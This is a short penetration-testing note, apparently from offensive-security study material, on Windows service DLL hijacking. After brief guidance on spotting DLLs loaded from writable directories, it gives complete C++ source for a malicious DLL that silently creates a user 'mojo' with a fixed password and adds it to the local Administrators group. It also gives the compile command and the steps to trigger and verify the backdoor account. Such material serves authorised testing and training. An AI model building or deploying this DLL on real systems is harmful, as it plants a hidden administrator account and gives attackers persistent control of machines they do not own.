# Service DLL Hijacking

Used when we discover a suspicious binary is calling DLLs in paths that we have write permissions to.

We can check the DLLs called at runtime by ideally running procmon on the target and restarting the service to see DLL calls, but we can also try executing the binary in a sandbox environment and inspect it there.

In the case where we see a DLL being called first in one of our writeable directories, we can hijack it.

**adduser.cpp**

```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user mojo Password123! /add");
  	    i = system ("net localgroup administrators Mojo /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

```bash
# Compile
x86_64-w64-mingw32-gcc adduser.cpp -o adduser.dll -shared
```

```powershell
Restart-Service $TARGET_SERVICE
Get-LocalUser
# mojo is visible
Get-LocalGroupMember Administrators
# mojo is visible
```
